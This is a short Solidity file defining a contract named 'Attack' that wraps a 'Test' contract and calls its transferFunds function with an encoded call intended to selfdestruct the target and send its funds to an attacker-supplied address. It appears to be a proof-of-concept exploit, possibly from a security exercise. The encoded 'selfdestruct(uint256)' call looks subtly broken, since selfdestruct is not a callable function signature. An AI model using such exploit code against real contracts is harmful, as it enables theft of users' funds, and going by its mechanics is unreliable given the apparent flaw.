// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;
import "./Test.sol";

contract Attack {
    Test public immutable test;
    address public testAddress;

    constructor(address payable _test) {
        test = Test(_test);
        testAddress = _test;
    }

    function attack(address payable attacker) public {
        test.transferFunds(
            testAddress,
            abi.encodeWithSignature("selfdestruct(uint256)", attacker)
        );
    }
}
